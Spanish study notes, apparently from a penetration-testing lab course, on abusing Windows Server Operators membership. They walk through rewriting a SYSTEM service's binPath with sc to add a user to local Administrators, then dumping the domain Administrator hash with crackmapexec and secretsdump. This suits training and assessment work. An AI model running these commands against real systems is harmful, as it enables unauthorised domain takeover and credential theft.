tags:
___
## 🧠 Concepto clave
El grupo **Server Operators** permite a sus miembros administrar servidores Windows sin necesitar privilegios de Domain Admin. Es un grupo de altísimo privilegio que puede iniciar sesión localmente en servidores, incluyendo Domain Controllers, y tiene control total sobre servicios locales. En la práctica, la combinación de `SeBackupPrivilege`, `SeRestorePrivilege` y la capacidad de modificar servicios que corren como SYSTEM lo convierte en un camino directo al compromiso total del dominio. 📄 [Server Operators — Microsoft Docs](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators)

| Privilegio / Capacidad | Qué es | Riesgo / Explotación |
|---|---|---|
| `SeBackupPrivilege` | Permite copiar archivos ignorando ACLs | Acceso a NTDS.dit, SAM y SYSTEM — compromiso total del dominio |
| `SeRestorePrivilege` | Permite restaurar archivos saltándose permisos | Sobreescritura de archivos críticos del sistema |
| **Control de servicios** | Los miembros tienen `SERVICE_ALL_ACCESS` sobre servicios del sistema | Modificar el binario de un servicio que corre como SYSTEM para ejecutar comandos arbitrarios |

## 📌 Puntos importantes

### El vector principal — Modificación de servicios

La capacidad más directamente explotable de este grupo es el control total (`SERVICE_ALL_ACCESS`) sobre servicios locales del sistema. Si un servicio corre como `LocalSystem` (SYSTEM) y los miembros de Server Operators pueden modificar su configuración, pueden cambiar el binario que ejecuta ese servicio por un comando arbitrario — añadirse al grupo de administradores locales, lanzar una reverse shell, o cualquier otra acción que se ejecutará en el contexto de SYSTEM.

El flujo consiste en identificar un servicio que corra como SYSTEM, verificar que Server Operators tiene permisos sobre él, modificar su `binPath` temporalmente, arrancarlo para que ejecute el comando, y confirmar el resultado. El servicio fallará al arrancar (porque el comando no es un servicio real), pero el comando habrá sido ejecutado igualmente.

> [!important] Al igual que con el ataque de DnsAdmins, **añadirse a un grupo no tiene efecto en la sesión actual**. Es necesario iniciar una nueva sesión o usar `runas` para que el token refleje la nueva membresía:
> ```cmd
> runas /user:INLANEFREIGHT\server_adm cmd
> ```
> `runas` — Lanza un nuevo proceso en el contexto de seguridad del usuario especificado, generando un token actualizado con los grupos actuales.
> `/user:INLANEFREIGHT\server_adm` — Usuario con el que se abrirá la nueva sesión.
> `cmd` — Proceso a lanzar con el token actualizado.

---

### Flujo de explotación — Control de servicios para añadirse a Administrators

**Paso 1 — Identificar un servicio que corra como SYSTEM**

> [!tip] Consultar la configuración del servicio AppReadiness
> ```cmd
> sc qc AppReadiness
> ```
> `qc` — Query Config. Muestra la configuración completa del servicio: tipo, modo de inicio, binario, cuenta de ejecución y dependencias.
> `AppReadiness` — Nombre del servicio a consultar. El campo `SERVICE_START_NAME: LocalSystem` confirma que corre como SYSTEM.

**Paso 2 — Verificar permisos del grupo Server Operators sobre el servicio**

**PsService** 📄 [PsService — Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice) es una utilidad de Sysinternals que, a diferencia de `sc`, muestra los permisos detallados sobre un servicio en formato legible. 📄 [Service Security and Access Rights — Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)

> [!tip] Verificar los permisos del grupo Server Operators sobre AppReadiness
> ```cmd
> c:\Tools\PsService.exe security AppReadiness
> ```
> `security` — Subcomando que muestra el security descriptor del servicio, con todos los grupos y sus permisos asociados.
> `AppReadiness` — Servicio a auditar. En la salida, `BUILTIN\Server Operators: All` confirma que tenemos `SERVICE_ALL_ACCESS` — control total sobre el servicio.

**Paso 3 — Confirmar que el usuario actual no es administrador local**

> [!tip] Listar miembros del grupo local Administrators
> ```cmd
> net localgroup Administrators
> ```
> `Administrators` — Nombre del grupo local a consultar. Confirma que la cuenta actual no está presente antes del ataque.

**Paso 4 — Modificar el binPath del servicio para ejecutar un comando**

> [!tip] Cambiar el binario del servicio para añadir el usuario actual a Administrators
> ```cmd
> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
> ```
> `config AppReadiness` — Modifica la configuración del servicio AppReadiness.
> `binPath=` — Especifica el nuevo binario (o comando) que ejecutará el servicio al iniciarse. El espacio tras `=` es obligatorio para que `sc` lo interprete correctamente.
> `"cmd /c net localgroup Administrators server_adm /add"` — Comando que se ejecutará como SYSTEM: añade el usuario `server_adm` al grupo local Administrators.

**Paso 5 — Arrancar el servicio para ejecutar el comando**

> [!tip] Iniciar el servicio para que ejecute el binPath modificado
> ```cmd
> sc start AppReadiness
> ```
> `start AppReadiness` — Inicia el servicio. Fallará con error 1053 (el servicio no respondió a tiempo) porque el comando no es un servicio real, pero el comando habrá sido ejecutado igualmente como SYSTEM antes de que se produzca el timeout.

**Paso 6 — Confirmar que el usuario fue añadido a Administrators**

> [!tip] Verificar la nueva membresía en el grupo local Administrators
> ```cmd
> net localgroup Administrators
> ```
> Si el ataque fue exitoso, `server_adm` aparecerá en la lista junto a los administradores preexistentes.

---

### Post-explotación — Acceso al DC y volcado de hashes

Con acceso de administrador local al Domain Controller, se puede verificar el acceso y volcar credenciales directamente desde la máquina atacante:

> [!tip] Verificar acceso de administrador local al DC con CrackMapExec
> ```bash
> crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
> ```
> `smb 10.129.43.9` — Protocolo y dirección IP del Domain Controller objetivo.
> `-u server_adm` — Usuario con el que autenticarse, ahora miembro de Administrators local.
> `-p 'HTB_@cademy_stdnt!'` — Contraseña del usuario. Si devuelve `(Pwn3d!)`, se tiene acceso de administrador local confirmado.

> [!tip] Volcar el hash NTLM del Administrador del dominio con secretsdump.py
> ```bash
> secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
> ```
> `server_adm@10.129.43.9` — Usuario con privilegios de admin local y dirección IP del DC.
> `-just-dc-user administrator` — Limita el volcado al usuario `administrator` del dominio en lugar de extraer todos los hashes. Útil para una demostración rápida de impacto sin generar ruido innecesario.

---

## 🔗 Relaciones / Contexto

**Server Operators** es un grupo que en muchos entornos se usa para delegar tareas de administración de servidores sin dar Domain Admin explícito — pero en la práctica, el control sobre servicios que corren como SYSTEM en un DC equivale exactamente a eso. Una vez obtenido acceso de administrador local al DC mediante este vector, el camino hacia el compromiso total del dominio es directo: secretsdump para extraer todos los hashes, pass-the-hash con el hash del Administrador del dominio, y movimiento lateral a cualquier sistema del entorno. Siempre documentar y revisar la membresía de este grupo durante un assessment.